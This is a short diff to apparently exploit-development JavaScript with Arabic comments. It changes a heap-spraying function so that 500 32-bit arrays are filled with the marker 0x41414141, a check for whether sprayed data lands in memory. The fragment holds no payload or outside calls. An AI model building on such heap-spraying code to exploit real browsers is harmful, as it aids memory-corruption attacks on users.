@@ -20,14 +20,16 @@
 
         // دالة رش الذاكرة (Heap Spraying)
         function sprayHeap() {
-            debug("Spraying heap with 500 buffers...");
-            let spray = [];
-            for (let i = 0; i < 500; i++) {
-                // نستخدم ArrayBuffer لتغيير تخطيط الذاكرة
-                spray.push(new Uint32Array(0x400));
-            }
-            return spray;
-        }
+    debug("Spraying heap with pattern 0x41414141...");
+    let spray = [];
+    for (let i = 0; i < 500; i++) {
+        // نملأ المصفوفة بنمط مميز لنرى هل سيظهر في الذاكرة
+        let arr = new Uint32Array(0x400);
+        arr.fill(0x41414141); 
+        spray.push(arr);
+    }
+    return spray;
+}
 
         window.onload = async () => {
             debug("System Initialized.");
